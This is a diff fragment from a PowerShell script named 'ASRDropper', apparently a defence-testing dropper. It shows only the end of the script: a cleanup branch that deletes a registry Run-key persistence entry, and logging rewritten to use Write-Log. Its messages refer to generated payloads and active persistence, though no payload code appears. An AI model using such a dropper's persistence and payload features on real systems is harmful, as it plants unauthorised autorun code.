-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" -ErrorAction SilentlyContinue
-    Write-Host "[CLEAN] Cleanup complete" -ForegroundColor Green
+    # Remove registry persistence
+    try {
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ASRDropper" -ErrorAction SilentlyContinue
+        Write-Log "Removed registry persistence" -Level SUCCESS
+    } catch {
+        Write-Log "Failed to remove registry persistence: $($_.Exception.Message)" -Level ERROR
+    }
+    
+    Write-Log "Cleanup complete" -Level SUCCESS
+} else {
+    Write-Log "Dropper execution complete" -Level SUCCESS
+    Write-Log "Files created in: $DropPath" -Level INFO
+    
+    if ($Persist) { 
+        Write-Log "WARNING: Persistence mechanisms enabled and will remain active" -Level WARNING
+    }
+    
+    if ($LogHtml) { 
+        Write-Log "HTML report saved to: $logPath" -Level INFO
+    }
+    
+    if (-not $Execute) { 
+        Write-Log "Payloads were generated but not executed (toggle Execute to run)" -Level INFO
+    }
 }
-else {
-    Write-Host "`n[SUCCESS] Dropper complete" -ForegroundColor Green
-    Write-Host "Files created in: $DropPath" -ForegroundColor Yellow
-    if ($Persist) { Write-Host "[WARNING] Persistence enabled" -ForegroundColor Yellow }
-    if ($LogHtml) { Write-Host "HTML report saved to: $logPath" -ForegroundColor Green }
-    if (-not $Execute) { Write-Host "[INFO] Payloads not executed (toggle Execute to run)" -ForegroundColor Cyan }
-}
+
+Write-Host "`n[COMPLETE] ASRDropper script execution finished." -ForegroundColor Green
+Write-Host "Check the log file for detailed execution information: $(Join-Path $DropPath $LogFile)" -ForegroundColor Cyan
